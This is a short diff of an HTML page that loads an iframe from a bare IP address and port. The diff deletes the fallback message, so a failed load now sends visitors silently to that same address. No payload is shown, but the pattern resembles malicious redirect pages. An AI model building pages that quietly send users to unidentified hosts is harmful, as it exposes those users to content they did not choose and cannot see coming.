@@ -33,8 +33,6 @@
             var fallbackText = document.querySelector('.fallback-text');
             
             iframe.onerror = function() {
-                iframe.style.display = 'none';
-                fallbackText.style.display = 'block';
                 window.location.href = 'http://185.219.84.39:24058';
             };
         };
@@ -42,6 +40,5 @@
 </head>
 <body>
   <iframe src="http://185.219.84.39:24058" sandbox="allow-same-origin allow-scripts"></iframe>
-  <p class="fallback-text"></p>
 </body>
 </html>
